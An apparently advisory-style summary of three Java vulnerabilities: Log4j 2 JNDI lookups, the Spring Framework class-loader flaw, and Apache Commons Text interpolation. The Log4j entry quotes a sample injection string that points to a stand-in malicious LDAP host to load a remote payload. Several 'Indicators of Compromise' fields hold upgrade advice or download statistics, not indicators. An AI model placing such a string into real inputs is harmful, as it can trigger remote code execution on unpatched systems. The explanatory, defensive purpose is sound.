Method of Attack: Attackers utilize how Log4j 2 manages logged strings which allow a macro of the format ${prefix:name} to point to malicious payloads
Attack Vector: Java Naming and Directory Interface (JNDI) and Lightweight Directory Access Protocol (LDAP) through the example pattern ${jndi:ldap://malicious.com/malwarepayload}
Indicators of Compromise: Data shows that a good percentage of Log4j downloads continue to be vulnerable versions

Method of Attack: An attacker can use a method called java.lang.Class.getModule() to access the class's module which links to the class loader and attack the java.lang.Class object
Impacted Systems: Systems running the application packaged as a WAR, within the Tomcat environment, on JDK 9 or newer, that includes spring-beans through a spring-webmvc or spring-webflux dependency, with Spring Framework versions 5.3.0 to 5.3.17, 5.2.0 to 5.2.19, and older versions
Attack Vector: New access to the class loader in certain properties surfaced by Spring
Indicators of Compromise: If such a system is exploitable, it can result in shell access

Method of Attack: The library performs a process called variable interpolation, which allows variables to be evaluated at runtime
Impacted Systems: Systems using Apache Commons Text library
Attack Vector: The prefix in the interpolation could point to a URL containing vulnerable code, resulting in remote code execution
Indicators of Compromise: Developers and security professionals should upgrade to 1.10.0 or later to avoid any further unforeseen embarrassment
